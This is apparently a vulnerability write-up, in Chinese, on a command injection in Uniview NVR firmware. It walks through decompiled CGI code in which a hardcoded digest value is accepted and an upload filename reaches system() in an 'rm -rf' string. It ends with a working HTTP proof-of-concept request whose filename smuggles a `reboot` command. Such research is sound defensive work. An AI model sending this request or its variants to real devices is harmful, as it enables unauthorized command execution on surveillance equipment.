# Uniview NVR command injection

## 版本

NVR301Q_General-B3503.10.10.210426

## 修复

在新版中该漏洞已修复

## 细节

在这个版本中的main-cgi程序中,存在一个特殊的票据`dcf0ef5d8f3fc7ee2733685c7debc953`，但并不意味着可以绕过认证，类似临时票据。

```C
  if (iVar7 == 0 || (iVar6 == 0 || (iVar5 == 0 || (iVar4 == 0 || iVar3 == 0)))) {
    uVar17 = 0xea66;
    pcVar18 = "Web request param is error, Error code = %d";
    uVar11 = 0x4f0;
    goto LAB_000bf834;
  }
  bVar1 = iVar8 == 0;
  if (bVar1) {
    local_78 = 0;
    local_74 = 0;
  }
  else {
    local_78 = data_json_value(param_1,&DAT_000f15f0);
    local_74 = data_json_value(param_1,"cnonce");
    if (local_74 == 0 || local_78 == 0) {
      uVar17 = 0xea66;
      pcVar18 = "Web request param is error, Error code = %d";
      uVar11 = 0x4f9;
      goto LAB_000bf834;
    }
  }
  iVar9 = strncasecmp(*(char **)(iVar7 + 0x10),"dcf0ef5d8f3fc7ee2733685c7debc953",0x20);//对比response是否相同
  if (iVar9 == 0) {
LAB_000bf7e4:
    puVar10 = *(undefined4 **)(iVar4 + 0x10);
LAB_000bf804:
    uVar11 = FUN_000dc4a0(puVar10);
    FUN_000dc150(param_1,"loginHandle",uVar11);
```

而我们的存在漏洞的url是`/LAPI/V1.0/PTZ/CustomProtocal/Configuration`


根据字符串定位到处理URL的函数`FUN_0009c350`

```C
int FUN_0009c350(undefined4 param_1)

{
  local_118 = 0;
  memset(&local_84,0,0x74);
  memset(acStack_e4,0,0x60);
  iVar1 = FUN_000d9898(&DAT_000e17bc,0x200000,&local_114); //这里存在命令执行
  if (iVar1 != 0) {
    BP_WriteLog(4,1,0x50000,"cgi_lapi_ptz.c",0xa18,"LAPI_PTZ_Post_CustomProtocal_Configuration",
                "LAPI read file stream error");
    return iVar1;
  }
  snprintf(acStack_e4,0x60,"%s/%s",&DAT_000e17bc,&local_114);

```

接下来跟入`FUN_000d9898`函数

```C
undefined4 FUN_000d9898(int param_1,int param_2,char *param_3)

{
  char *pcVar1;
  char *pcVar2;
    ...
  char acStack_a8 [132];
  
  memset(acStack_1a8,0,0x80);
  memset(acStack_128,0,0x80);
  memset(acStack_a8,0,0x80);
  if (param_3 == (char *)0x0 || param_1 == 0) {
    pcVar1 = "Func para is null";
    uVar9 = 0x11a0;
LAB_000d99f0:
    BP_WriteLog(4,1,0x50000,"cgi_public.c",uVar9,"LAPI_COMMON_GET_Upload_FileFromExtern",pcVar1);
    return 1;
  }
  pcVar1 = getenv("CONTENT_TYPE"); //获取环境变量
  if (pcVar1 == (char *)0x0) {
    pcVar1 = "Content-Type is not found.";
    uVar9 = 0x11ab;
  }
  else {
    pcVar2 = strstr(pcVar1,"boundary="); //判断boundary是否存在
    if (pcVar2 == (char *)0x0) {
      pcVar1 = "NO find the Boundary.";
      uVar9 = 0x11b3;
    }
    else {
      pcVar1 = strtok(pcVar1,"=");
      if (pcVar1 == (char *)0x0) {
        pcVar1 = "Content-Type is not correct.";
        uVar9 = 0x11ba;
      }
      else {
        pcVar1 = strtok((char *)0x0,"=");
        if (pcVar1 == (char *)0x0) {
          pcVar1 = "stream boundary is NULL";
          uVar9 = 0x129b;
          goto LAB_000d99f0;
        }
        pcVar2 = getenv("CONTENT_LENGTH"); //获取length
        if (pcVar2 == (char *)0x0) {
          pcVar1 = "CONTENT_LENGTH is NULL.";
          uVar9 = 0x11c4;
        }
        else {
          sVar3 = atol(pcVar2);
          if ((int)sVar3 < 1) {
            pcVar1 = "File Size is 0 Byte.";
            uVar9 = 0x11cd;
          }
          else {
            if ((int)sVar3 <= param_2) {
              if (0xfffff < (int)sVar3) {
                pcVar2 = (char *)malloc(0x100000);
                sVar10 = 0x100000;
              }
              else {
                pcVar2 = (char *)malloc(sVar3 + 1);
                sVar10 = sVar3;
              }
              if (pcVar2 == (char *)0x0) {
                BP_WriteLog(4,1,0x50000,"cgi_public.c",0x11e5,
                          ...
              pcVar5 = strstr(pcVar2,pcVar1);
              if ((pcVar5 == (char *)0x0) || ((int)pcVar5 - (int)pcVar2 < 0)) {
                uVar9 = 0x11f2;
                pcVar1 = "Failed to find the Boundary";
              }
              else {
                sVar4 = strlen(pcVar1);
                iVar7 = ((int)pcVar5 - (int)pcVar2) + 2 + sVar4;
                pcVar5 = strstr(pcVar2 + iVar7,"\r\n");
                if ((pcVar5 == (char *)0x0) ||
                   (iVar8 = (int)pcVar5 - (int)(pcVar2 + iVar7), iVar8 < 0)) {
                  uVar9 = 0x11fc;
                  pcVar1 = "Failed to find the \\r\\n after Content-Disposition.";
                }
                else {
                  pcVar5 = strstr(pcVar2,"Content-Disposition");//判断Content-Disposition
                  if (pcVar5 == (char *)0x0) {
                    uVar9 = 0x1205;
                    pcVar1 = "find Content-Disposition Failed.";
                  }
                  else {
                    BP_WriteLog(1,0,0x50000,"cgi_public.c",0x120a,
                                "LAPI_COMMON_GET_Upload_FileFromExtern","Content-Disposition: [%s]",
                                pcVar5);
                    pcVar6 = pcVar5;
                    BP_WriteLog(1,0,0x50000,"cgi_public.c",0x115d,
                                "CGI_COMMON_Get_FileNameFromContent_Disposition",
                                "Param pcContentDisp = [%s].",pcVar5);
                    pcVar5 = strstr(pcVar5,"filename=");
                    if (pcVar5 == (char *)0x0) { //这里判断filename是否为空
                      BP_WriteLog(4,1,0x50000,"cgi_public.c",0x1163,
                                  "CGI_COMMON_Get_FileNameFromContent_Disposition",
                                  "find fileName is NULL.",pcVar6);
                      BP_WriteLog(4,1,0x50000,"cgi_public.c",0x1210,
                                  "LAPI_COMMON_GET_Upload_FileFromExtern",
                                  "Get Content-Disposition filename fail.");
                      free(pcVar2);
                      return 0xea9e;
                    }
                    pcVar6 = pcVar5 + 9;
                    if (pcVar5[9] == '\r' || pcVar5[9] == '\n') {
                      iVar11 = -2;
                      sVar4 = 0xffffffff;
                    }
                    else {
                      sVar12 = 0;
                      do {
                        sVar4 = sVar12;
                        pcVar6 = pcVar6 + 1;
                        sVar12 = sVar4 + 1;
                      } while (*pcVar6 != '\r' && *pcVar6 != '\n');
                      iVar11 = sVar4 - 1;
                    }
                    strncpy(acStack_128,pcVar5 + 10,sVar4);
                    acStack_128[iVar11] = '\0';
                    pcVar5 = (char *)BP_strlstr(acStack_128,'\\',1);
                    if (pcVar5 == (char *)0x0) {
                      sVar4 = strlen(acStack_128);
                      strncpy(param_3,acStack_128,sVar4 + 1);//这里将获取的filename，cpy到param_3中
                      param_3[sVar4] = '\0';
                    }
                    else {
                      sVar4 = strlen(pcVar5);
                      strncpy(param_3,pcVar5 + 1,sVar4 + 1);
                      sVar4 = strlen(pcVar5);
                      param_3[sVar4] = '\0';
                    }
                    iVar7 = iVar7 + iVar8;
                    BP_snprintf(acStack_a8,0x80,"%s/%s",param_1,param_3);//将param_3格式化到acStack_a8中
                    pcVar5 = strstr(pcVar2 + iVar7 + 2,"\r\n");
                    if ((pcVar5 == (char *)0x0) ||
                       (iVar8 = (int)pcVar5 - (int)(pcVar2 + iVar7 + 2), iVar8 < 0)) {
                      pcVar1 = "Failed to find the \\r\\n after Content-Type.";
                      uVar9 = 0x122c;
                    }
                    else {
                      sVar4 = strlen(pcVar1);
                      iVar8 = iVar7 + 6 + iVar8;
                      sVar4 = ((sVar3 - iVar8) - sVar4) - 8;
                      BP_WriteLog(1,0,0x50000,"cgi_public.c",0x1237,
                                  "LAPI_COMMON_GET_Upload_FileFromExtern","Program.bin length = %lu"
                                  ,sVar4);
                      if (-1 < (int)sVar4) {
                        BP_snprintf(acStack_1a8,0x80,"rm -rf %s 1>/dev/null 2>&1",acStack_a8);//这里再一次格式acStack_a8
                        BP_WriteLog(1,0,0x50000,"cgi_public.c",0x1242,
                                    "LAPI_COMMON_GET_Upload_FileFromExtern",
                                    "Delete File_Path = [%s].",acStack_1a8);
                        system(acStack_1a8); //最后在这里执行了命令

```
聪明的小朋友很快就会发现这是个对于文件上传包的处理，没错我们只需要构造一个上传的包并更改filename的值就可以注入命令了

## poc

```https

POST /LAPI/V1.0/PTZ/CustomProtocal/Configuration?TaskID=1 HTTP/1.1
Host: 127.0.0.1
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
Authorization: Digest username="aaa",realm="NVRDVR",qop=auth, nonce="1212883611",algorithm=MD5,cnonce="770278536",nc=00000001,uri="/LAPI/V1.0/System/Security/Login",response="dcf0ef5d8f3fc7ee2733685c7debc953"
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
Cache-Control: no-cache
Cache-Control: no-cache
Content-Length: 211

------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="ptzCfgFile"; filename="y`reboot`a"
Content-Type: multipart/form-data

aaaaa
------WebKitFormBoundary7MA4YWxkTrZu0gW--

```
